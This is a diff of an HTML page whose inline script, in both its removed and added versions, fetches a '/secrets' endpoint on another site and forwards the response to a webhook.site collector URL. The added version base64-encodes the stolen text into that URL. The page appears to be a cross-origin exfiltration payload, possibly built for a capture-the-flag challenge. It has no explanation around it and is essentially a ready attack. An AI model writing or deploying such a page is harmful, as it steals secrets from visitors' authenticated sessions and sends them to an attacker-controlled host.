@@ -7,21 +7,12 @@
 <body>
   <script>
     const webhook = "https://webhook.site/c0b9443f-e66f-4aa7-a0b7-51437258a216";
-    fetch("https://api.takedown.cyxo.re/secrets", {
-    "headers": {
-        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:156.0) Gecko/20100101 Firefox/156.0",
-        "Accept": "*/*",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Sec-Fetch-Dest": "empty",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Site": "same-site",
-        "Sec-GPC": "1",
-        "Priority": "u=4"
-    },
-    "referrer": "https://takedown.cyxo.re/",
-    "method": "GET",
-    "mode": "cors"
-}).then(r => r.json()).then(data => fetch(webhook, {method: "POST", "Content-Type":"application/json", body:data}))
-  </script>
+  fetch("https://api.takedown.cyxo.re/secrets").then(function(r) {
+    r.text().then(function(t) {
+      fetch("https://webhook.site/c0b9443f-e66f-4aa7-a0b7-51437258a216/" + btoa(t));
+    });
+  });
+</script>
+
 </body>
 </html>
